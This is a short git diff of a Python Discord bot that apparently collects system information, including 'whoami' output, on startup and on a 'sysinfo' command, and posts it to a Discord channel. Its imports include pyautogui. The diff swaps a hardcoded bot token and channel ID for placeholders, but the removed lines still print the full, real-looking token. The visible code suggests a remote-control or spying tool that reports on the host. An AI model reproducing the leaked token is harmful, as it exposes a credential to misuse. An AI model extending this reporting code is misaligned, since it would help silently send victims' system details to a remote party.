@@ -6,7 +6,7 @@ import pyautogui
 import os
 from discord.ext import commands
 
-TOKEN = 'MTE0NzI1NDg2ODcwMTA5Nzk4NA.G0yTtf.X2Uf3yFe0DEcvkTsmchvRbGr4aQ2tUgGKqizm8'
+TOKEN = 'YOUR_TOKEN'
 
 intents = discord.Intents.all()
 
@@ -36,7 +36,7 @@ async def on_ready():
     
     system_info += f'WhoAmI: {whoami_result}'
 
-    channel_id = 1147256028803641447
+    channel_id = CHANNEL_ID
     channel = bot.get_channel(channel_id)
 
     if channel:
@@ -95,7 +95,7 @@ async def sysinfo(ctx):
     
     system_info += f'WhoAmI: {whoami_result}'
 
-    channel_id = 1147256028803641447
+    channel_id = CHANNEL_ID
     channel = bot.get_channel(channel_id)
 
     if channel:
